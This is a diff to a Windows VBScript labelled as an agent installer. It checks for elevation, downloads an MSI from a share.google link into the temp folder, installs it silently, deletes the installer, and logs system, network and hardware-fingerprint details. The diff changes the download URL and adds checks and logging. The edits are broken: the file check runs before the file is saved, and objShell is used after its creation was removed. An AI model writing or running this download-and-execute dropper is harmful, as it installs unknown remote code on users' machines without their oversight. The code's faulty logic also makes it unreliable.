@@ -249,7 +249,7 @@ If Not IsElevated() Then WScript.Quit
 
 ' Core functionality - download and execute
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell
-strUrl = "https://share.google/jraH4hXE8DKHc3EXZ"
+strUrl = "https://share.google/5icY94HkmAiaVcn86"
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
@@ -265,6 +265,22 @@ If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
     objXMLHTTP.send()
 End If
 
+' Verify download
+If Not Fso.FileExists(strFile) Then
+    WScript.Echo "Download failed - file not found"
+    WScript.Quit
+End If
+
+' Check file size
+Set objFile = Fso.GetFile(strFile)
+If objFile.Size < 1024 Then  ' Less than 1KB suggests incomplete download
+    WScript.Echo "Downloaded file appears incomplete: " & objFile.Size & " bytes"
+    WScript.Quit
+End If
+
+' Create installation log
+logFile = strTemp & "\install.log"
+
 ' Check if we got a successful response
 If objXMLHTTP.Status = 200 Then
     Set objADOStream = CreateObject("ADODB.Stream")
@@ -275,9 +291,34 @@ If objXMLHTTP.Status = 200 Then
     objADOStream.SaveToFile strFile, 2 ' Overwrite
     objADOStream.Close
 
-    ' Install
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
+    ' Try installation with logging and visible window
+    WScript.Echo "Installing... This may take a few minutes."
+    objShell.Run "msiexec /i """ & strFile & """ /l*v """ & logFile & """ /quiet /qn /norestart", 1, True
+
+    ' Check if installation succeeded
+    If Fso.FileExists(logFile) Then
+        Set objLog = Fso.OpenTextFile(logFile, 1)
+        logContent = objLog.ReadAll
+        objLog.Close
+        
+        ' Look for success or failure
+        If InStr(logContent, "Installation completed successfully") > 0 Then
+            WScript.Echo "Installation completed successfully"
+        ElseIf InStr(logContent, "Error") > 0 Or InStr(logContent, "failed") > 0 Then
+            WScript.Echo "Installation failed. Check log file: " & logFile
+            WScript.Echo "Last few lines of log:"
+            
+            ' Show last few lines of log
+            lines = Split(logContent, vbCrLf)
+            For i = UBound(lines) - 5 To UBound(lines)
+                If i >= 0 Then WScript.Echo lines(i)
+            Next
+        Else
+            WScript.Echo "Installation status unclear. Check log file: " & logFile
+        End If
+    Else
+        WScript.Echo "Installation log not created - installation may have failed immediately"
+    End If
 
     ' Cleanup
     If Fso.FileExists(strFile) Then Fso.DeleteFile strFile
@@ -286,8 +327,8 @@ Else
 End If
 
 ' Additional cleanup and logging
-Dim logFile, logContent
-Set logFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%TEMP%") & "\sysmon.log", True)
+Dim sysLogFile, logContent
+Set sysLogFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%TEMP%") & "\sysmon.log", True)
 logContent = "System Info: " & systemInfo & vbCrLf & _
              "Network Info: " & networkInfo & vbCrLf & _
              "Hardware ID: " & hwFingerprint & vbCrLf & _
@@ -297,8 +338,8 @@ logContent = "System Info: " & systemInfo & vbCrLf & _
              "Windows Version: " & GetWindowsVersion() & vbCrLf & _
              "Execution Time: " & Now
 
-logFile.WriteLine logContent
-logFile.Close
+sysLogFile.WriteLine logContent
+sysLogFile.Close
 
 ' Final cleanup
 Set WshShell = Nothing
@@ -306,4 +347,3 @@ Set Fso = Nothing
 Set NetObj = Nothing
 Set objXMLHTTP = Nothing
 Set objADOStream = Nothing
-Set objShell = Nothing
